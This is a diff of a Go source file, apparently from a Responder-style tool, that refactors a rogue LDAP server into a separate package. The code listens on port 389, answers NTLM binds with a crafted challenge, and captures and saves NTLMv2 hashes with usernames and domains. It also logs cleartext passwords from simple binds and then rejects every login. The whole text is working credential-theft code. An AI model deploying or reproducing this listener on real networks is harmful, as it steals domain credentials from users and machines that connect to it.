@@ -1,33 +1,35 @@
-package main
+package server
 
 import (
 	"encoding/binary"
 	"fmt"
 	"net"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-func serveLDAP(ifaceIP net.IP) {
+func ServeLDAP(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:389", ifaceIP))
 	if err != nil {
-		logError("LDAP listen :389 — %v (need root?)", err)
+		core.LogError("LDAP listen :389 — %v (need root?)", err)
 		return
 	}
-	logInfo("LDAP listening on %s:389", ifaceIP)
+	core.LogInfo("LDAP listening on %s:389", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handleLDAP(c)
+		go HandleLDAP(c)
 	}
 }
 
-func handleLDAP(c net.Conn) {
+func HandleLDAP(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(30 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	var msgID int
 
 	buf := make([]byte, 8192)
@@ -38,7 +40,6 @@ func handleLDAP(c net.Conn) {
 		}
 		pkt := buf[:n]
 
-		// LDAP messages are BER SEQUENCE (0x30)
 		if len(pkt) < 2 || pkt[0] != 0x30 {
 			return
 		}
@@ -48,7 +49,6 @@ func handleLDAP(c net.Conn) {
 			return
 		}
 
-		// messageID: INTEGER (0x02)
 		if len(inner) < 3 || inner[0] != 0x02 {
 			return
 		}
@@ -61,7 +61,6 @@ func handleLDAP(c net.Conn) {
 		}
 		inner = inner[2+idLen:]
 
-		// ProtocolOp: [APPLICATION 0] = BindRequest (0x60)
 		if len(inner) < 2 || inner[0] != 0x60 {
 			continue
 		}
@@ -70,32 +69,28 @@ func handleLDAP(c net.Conn) {
 			return
 		}
 
-		// version INTEGER (skip)
 		if len(bindBody) < 3 || bindBody[0] != 0x02 {
 			return
 		}
 		verLen := int(bindBody[1])
 		bindBody = bindBody[2+verLen:]
 
-		// name OCTET STRING (skip)
 		if len(bindBody) < 2 || bindBody[0] != 0x04 {
 			return
 		}
 		nameLen := int(bindBody[1])
 		bindBody = bindBody[2+nameLen:]
 
-		// authentication: [3] sasl (0xa3) or [0] simple (0x80)
 		if len(bindBody) < 2 {
 			return
 		}
 		authTag := bindBody[0]
 
-		if authTag == 0xa3 { // SASL
+		if authTag == 0xa3 {
 			saslBody, ok := berInner(bindBody)
 			if !ok {
 				return
 			}
-			// mechanism: OCTET STRING
 			if len(saslBody) < 2 || saslBody[0] != 0x04 {
 				return
 			}
@@ -104,11 +99,10 @@ func handleLDAP(c net.Conn) {
 			saslBody = saslBody[2+mechLen:]
 
 			if mech != "GSS-SPNEGO" && mech != "NTLM" && mech != "GSSAPI" {
-				logVerbose("LDAP unknown SASL mechanism: %s", mech)
+				core.LogVerbose("LDAP unknown SASL mechanism: %s", mech)
 				return
 			}
 
-			// credentials: OCTET STRING (optional)
 			if len(saslBody) < 2 || saslBody[0] != 0x04 {
 				return
 			}
@@ -119,36 +113,36 @@ func handleLDAP(c net.Conn) {
 			}
 			creds := saslBody[credOff : credOff+credLen]
 
-			ntlm := FindNTLMSSP(creds)
+			ntlm := core.FindNTLMSSP(creds)
 			if len(ntlm) < 12 {
 				return
 			}
 			msgType := binary.LittleEndian.Uint32(ntlm[8:12])
 
 			switch msgType {
-			case 1: // NTLM negotiate → send challenge
-				ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
-				spnego := WrapSPNEGOChallenge(ntlmChallenge)
-				resp := ldapBindResponse(msgID, 14, spnego) // 14 = saslBindInProgress
+			case 1:
+				ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
+				spnego := core.WrapSPNEGOChallenge(ntlmChallenge)
+				resp := ldapBindResponse(msgID, 14, spnego)
 				c.Write(resp)
-				logVerbose("LDAP NTLM Type1 from %s — issuing challenge", c.RemoteAddr())
+				core.LogVerbose("LDAP NTLM Type1 from %s — issuing challenge", c.RemoteAddr())
 
-			case 3: // NTLM authenticate → capture
-				hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
+			case 3:
+				hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm, challenge)
 				if err != nil {
-					logVerbose("LDAP NTLM parse: %v", err)
+					core.LogVerbose("LDAP NTLM parse: %v", err)
 					return
 				}
-				logSuccess("[LDAP] NTLMv2 captured from %s", c.RemoteAddr())
-				logSuccess("       %s\\%s", domain, user)
-				logSuccess("       %s", hash)
-				saveHash(hash)
-				resp := ldapBindResponse(msgID, 49, nil) // 49 = invalidCredentials
+				core.LogSuccess("[LDAP] NTLMv2 captured from %s", c.RemoteAddr())
+				core.LogSuccess("       %s\\%s", domain, user)
+				core.LogSuccess("       %s", hash)
+				core.SaveHash(hash)
+				resp := ldapBindResponse(msgID, 49, nil)
 				c.Write(resp)
 				return
 			}
 
-		} else if authTag == 0x80 { // simple bind — can capture plaintext
+		} else if authTag == 0x80 {
 			simpleLen := berReadLen(bindBody[1:])
 			simpleOff := 1 + berLenBytes(simpleLen)
 			if simpleOff+simpleLen > len(bindBody) {
@@ -156,7 +150,7 @@ func handleLDAP(c net.Conn) {
 			}
 			pass := string(bindBody[simpleOff : simpleOff+simpleLen])
 			if pass != "" {
-				logSuccess("[LDAP] Cleartext bind from %s: password=%q", c.RemoteAddr(), pass)
+				core.LogSuccess("[LDAP] Cleartext bind from %s: password=%q", c.RemoteAddr(), pass)
 			}
 			resp := ldapBindResponse(msgID, 49, nil)
 			c.Write(resp)
@@ -165,34 +159,27 @@ func handleLDAP(c net.Conn) {
 	}
 }
 
-// ldapBindResponse builds a minimal LDAP BindResponse BER packet.
-// resultCode: 14=saslBindInProgress, 49=invalidCredentials, 0=success
-// serverSaslCreds: if non-nil, appended as [7] OPTIONAL
 func ldapBindResponse(msgID int, resultCode int, serverSaslCreds []byte) []byte {
-	// Build BindResponse body
 	var body []byte
-	body = append(body, berTag(0x0a, []byte{byte(resultCode)})...) // ENUMERATED resultCode
-	body = append(body, 0x04, 0x00)                                // matchedDN ""
-	body = append(body, 0x04, 0x00)                                // diagnosticMessage ""
+	body = append(body, berTag(0x0a, []byte{byte(resultCode)})...)
+	body = append(body, 0x04, 0x00)
+	body = append(body, 0x04, 0x00)
 	if serverSaslCreds != nil {
-		body = append(body, berTag(0x87, serverSaslCreds)...) // [7] serverSaslCreds
+		body = append(body, berTag(0x87, serverSaslCreds)...)
 	}
-	bindResp := berTag(0x61, body) // [APPLICATION 1]
+	bindResp := berTag(0x61, body)
 
 	var msgIDBuf [4]byte
 	binary.BigEndian.PutUint32(msgIDBuf[:], uint32(msgID))
-	// trim leading zeros
 	msgIDBytes := msgIDBuf[:]
 	for len(msgIDBytes) > 1 && msgIDBytes[0] == 0 {
 		msgIDBytes = msgIDBytes[1:]
 	}
-	msgIDField := berTag(0x02, msgIDBytes) // INTEGER
+	msgIDField := berTag(0x02, msgIDBytes)
 
 	msg := append(msgIDField, bindResp...)
-	return berTag(0x30, msg) // SEQUENCE
+	return berTag(0x30, msg)
 }
-
-// BER helpers for LDAP
 
 func berTag(tag byte, data []byte) []byte {
 	out := []byte{tag}
@@ -208,7 +195,6 @@ func berTag(tag byte, data []byte) []byte {
 	return append(out, data...)
 }
 
-// berInner returns the inner bytes of a TLV, stripping tag and length.
 func berInner(data []byte) ([]byte, bool) {
 	if len(data) < 2 {
 		return nil, false
